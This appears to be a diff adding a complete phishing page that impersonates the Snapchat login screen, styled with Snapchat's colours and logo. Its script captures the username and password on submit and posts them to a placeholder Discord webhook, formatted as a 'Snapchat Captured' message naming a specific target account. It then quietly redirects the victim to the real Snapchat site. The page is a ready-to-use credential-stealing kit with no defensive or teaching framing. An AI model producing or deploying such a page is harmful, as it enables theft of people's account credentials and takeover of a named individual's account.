@@ -1,0 +1,51 @@
+!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Login</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #FFFC00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 2rem; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 320px; text-align: center; }
+        .logo { width: 100px; margin-bottom: 1rem; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
+        button { background: #FFFC00; color: black; border: none; padding: 12px; width: 100%; border-radius: 24px; font-weight: bold; cursor: pointer; margin-top: 16px; }
+        button:hover { background: #e6e600; }
+        .error { color: red; font-size: 14px; margin-top: 8px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/Snapchat_Logo.svg/240px-Snapchat_Logo.svg.png" class="logo" alt="Snapchat">
+        <h2>Welcome Back</h2>
+        <form id="snapForm">
+            <input type="text" id="username" placeholder="Username or Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+            <div class="error" id="errorMsg"></div>
+        </form>
+    </div>
+    <script>
+        document.getElementById('snapForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            
+            // 🔗 REPLACE WITH YOUR ENDPOINT
+            const payload = { username: user, password: pass, target: 'jeuamz715', timestamp: new Date().toISOString() };
+            
+            // Discord Webhook Example (replace URL)
+            fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `📩 **Snapchat Captured**\n👤 User: \`${user}\`\n🔑 Pass: \`${pass}\`\n🎯 Target: \`jeuamz715\`` })
+            }).catch(() => {});
+
+            // End link redirect
+            setTimeout(() => {
+                window.location.href = 'https://www.snapchat.com/';
+            }, 800);
+        });
+    </script>
+</body>
+</html>
